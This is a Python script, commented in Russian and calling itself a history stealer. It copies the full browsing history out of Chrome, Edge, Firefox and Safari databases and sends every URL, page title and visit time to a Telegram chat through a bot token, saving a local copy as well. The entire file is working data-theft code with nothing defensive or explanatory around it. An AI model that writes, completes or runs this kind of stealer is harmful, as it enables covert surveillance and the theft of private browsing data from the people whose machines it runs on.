import os
import sqlite3
import shutil
from datetime import datetime, timedelta
from telegram import Bot
import asyncio
import logging
import platform

# Настройка логирования
logging.basicConfig(
    filename="history_stealer.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Настройки Telegram
BOT_TOKEN = "ВАШ ТОКЕН"  # Вставь токен от BotFather
CHAT_ID = "ВАШ АЙДИ"  # Вставь твой chat ID
MAX_MESSAGE_LENGTH = 4000  # Telegram лимит на сообщение
OUTPUT_FILE = "browser_history.txt"  # Файл для сохранения истории


async def send_to_telegram(messages):
    bot = Bot(token=BOT_TOKEN)
    try:
        for message in messages:
            await bot.send_message(chat_id=CHAT_ID, text=message, parse_mode="HTML")
        logging.info("История успешно отправлена в Telegram")
        print("История улетела в Telegram, братан!")
    except Exception as e:
        error_msg = f"Пиздец, не смог отправить в Telegram: {e}"
        logging.error(error_msg)
        print(error_msg)


def split_message(message):
    """Разбивает длинное сообщение на части для Telegram"""
    messages = []
    while len(message) > MAX_MESSAGE_LENGTH:
        split_point = message[:MAX_MESSAGE_LENGTH].rfind("\n\n")
        if split_point == -1:
            split_point = MAX_MESSAGE_LENGTH
        messages.append(message[:split_point])
        message = message[split_point:]
    messages.append(message)
    return messages


def save_to_file(browser_name, results):
    """Сохраняет историю в текстовый файл"""
    try:
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n=== {browser_name} ===\n")
            for url, title, visit_time in results:
                f.write(f"Время: {visit_time}\nЗаголовок: {title or 'Без названия'}\nURL: {url}\n\n")
        logging.info(f"История {browser_name} сохранена в {OUTPUT_FILE}")
    except Exception as e:
        error_msg = f"Ошибка сохранения истории {browser_name} в файл: {e}"
        logging.error(error_msg)
        print(error_msg)
        asyncio.run(send_to_telegram([error_msg]))


def get_browser_history(browser_name, history_path):
    """Извлекает полную историю из указанного браузера"""
    temp_history = f"temp_{browser_name}_history.db"

    # Проверяем, существует ли файл
    if not os.path.exists(history_path):
        error_msg = f"Файл истории {browser_name} не найден! Браузер установлен?"
        logging.error(error_msg)
        print(error_msg)
        asyncio.run(send_to_telegram([error_msg]))
        return []

    # Копируем файл
    try:
        shutil.copyfile(history_path, temp_history)
        logging.info(f"Файл истории {browser_name} скопирован")
    except PermissionError:
        error_msg = f"Закрой {browser_name}, сука, файл заблокирован!"
        logging.error(error_msg)
        print(error_msg)
        asyncio.run(send_to_telegram([error_msg]))
        return []
    except Exception as e:
        error_msg = f"Ошибка копирования файла {browser_name}: {e}"
        logging.error(error_msg)
        print(error_msg)
        asyncio.run(send_to_telegram([error_msg]))
        return []

    # Коннектимся к базе
    try:
        conn = sqlite3.connect(temp_history)
        cursor = conn.cursor()

        if browser_name == "Safari":
            query = """
            SELECT h.url, h.title, datetime(v.visit_time + 978307200, 'unixepoch') as visit_time
            FROM history_items h
            JOIN history_visits v ON h.id = v.history_item
            ORDER BY v.visit_time DESC
            """
        else:  # Chrome, Edge, Firefox
            query = """
            SELECT urls.url, urls.title, datetime(visits.visit_time/1000000-11644473600, 'unixepoch') as visit_time
            FROM urls
            JOIN visits ON urls.id = visits.url
            ORDER BY visits.visit_time DESC
            """

        cursor.execute(query)
        results = cursor.fetchall()

        if not results:
            error_msg = f"История {browser_name} пуста, нихуя не найдено!"
            logging.warning(error_msg)
            print(error_msg)
            asyncio.run(send_to_telegram([error_msg]))
            conn.close()
            os.remove(temp_history)
            return []

        # Сохраняем в файл
        save_to_file(browser_name, results)

        conn.close()
        os.remove(temp_history)
        logging.info(f"Временная база {browser_name} удалена")
        return results

    except sqlite3.OperationalError as e:
        error_msg = f"Ошибка базы {browser_name}: {e}"
        logging.error(error_msg)
        print(error_msg)
        asyncio.run(send_to_telegram([error_msg]))
        return []
    except Exception as e:
        error_msg = f"Непонятный пиздец с {browser_name}: {e}"
        logging.error(error_msg)
        print(error_msg)
        asyncio.run(send_to_telegram([error_msg]))
        return []
    finally:
        if os.path.exists(temp_history):
            try:
                os.remove(temp_history)
                logging.info(f"Временная база {browser_name} удалена в finally")
            except Exception as e:
                logging.error(f"Не смог удалить временную базу {browser_name}: {e}")


def get_browser_paths():
    """Возвращает пути к файлам истории для всех браузеров"""
    paths = {}
    user_home = os.path.expanduser("~")

    # Chrome
    if os.name == "nt":  # Windows
        paths["Chrome"] = user_home + r"\AppData\Local\Google\Chrome\User Data\Default\History"
    else:  # Mac/Linux
        paths["Chrome"] = user_home + "/Library/Application Support/Google/Chrome/Default/History"

    # Edge
    if os.name == "nt":
        paths["Edge"] = user_home + r"\AppData\Local\Microsoft\Edge\User Data\Default\History"
    else:
        paths["Edge"] = user_home + "/Library/Application Support/Microsoft Edge/Default/History"

    # Firefox
    if os.name == "nt":
        firefox_path = user_home + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
    else:
        firefox_path = user_home + "/Library/Application Support/Firefox/Profiles"

    try:
        for profile in os.listdir(firefox_path):
            profile_path = os.path.join(firefox_path, profile)
            if os.path.isdir(profile_path) and "places.sqlite" in os.listdir(profile_path):
                paths["Firefox"] = os.path.join(profile_path, "places.sqlite")
                break
    except FileNotFoundError:
        logging.warning("Папка Firefox не найдена")

    # Safari (только Mac)
    if platform.system() == "Darwin":
        paths["Safari"] = user_home + "/Library/Safari/History.db"

    return paths


def main():
    print("Запускаю кражу ВСЕЙ истории со всех браузеров, держись, ебать!")
    logging.info("Скрипт запущен")

    # Очищаем файл истории, если он уже существует
    if os.path.exists(OUTPUT_FILE):
        try:
            os.remove(OUTPUT_FILE)
            logging.info(f"Старый файл {OUTPUT_FILE} удалён")
        except Exception as e:
            logging.error(f"Не смог удалить старый файл {OUTPUT_FILE}: {e}")

    browser_paths = get_browser_paths()
    all_messages = []

    for browser, history_path in browser_paths.items():
        print(f"Обрабатываю {browser}...")
        logging.info(f"Обрабатываю {browser}")
        results = get_browser_history(browser, history_path)

        if results:
            message = f"<b>История {browser} (все записи):</b>\n\n"
            for url, title, visit_time in results:
                entry = f"<b>Время:</b> {visit_time}\n<b>Заголовок:</b> {title or 'Без названия'}\n<b>URL:</b> {url}\n\n"
                if len(message) + len(entry) <= MAX_MESSAGE_LENGTH:
                    message += entry
                else:
                    all_messages.extend(split_message(message))
                    message = f"<b>История {browser} (продолжение):</b>\n\n" + entry

            all_messages.extend(split_message(message))

    if all_messages:
        asyncio.run(send_to_telegram(all_messages))
        final_msg = f"Полная история сохранена в {OUTPUT_FILE}. Если Telegram обрезал — чекни файл!"
        print(final_msg)
        logging.info(final_msg)
        asyncio.run(send_to_telegram([final_msg]))
    else:
        error_msg = "Ни один браузер не дал историю, сука! Проверь, закрыты ли браузеры."
        logging.error(error_msg)
        print(error_msg)
        asyncio.run(send_to_telegram([error_msg]))


if __name__ == "__main__":
    main()
